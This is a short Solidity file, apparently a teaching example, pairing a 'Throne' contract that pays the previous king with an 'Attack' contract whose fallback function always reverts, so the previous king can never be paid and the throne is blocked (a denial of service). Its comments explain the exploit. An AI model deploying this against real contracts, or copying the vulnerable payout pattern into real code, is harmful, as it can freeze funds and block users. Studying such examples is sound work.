// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Throne {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");
        
        // this contract cannot transfer ether to attack contract
        // denial of service because attack does not have receive / fallback function to receive ether
        (bool sent, ) = king.call{value: balance}("");
        //require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    Throne throne;

    constructor(Throne _throne) {
        throne = Throne(_throne);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    fallback() external payable {
        assert(false);
    }

    function attack() public payable {
        throne.claimThrone{value: msg.value}();
    }
}
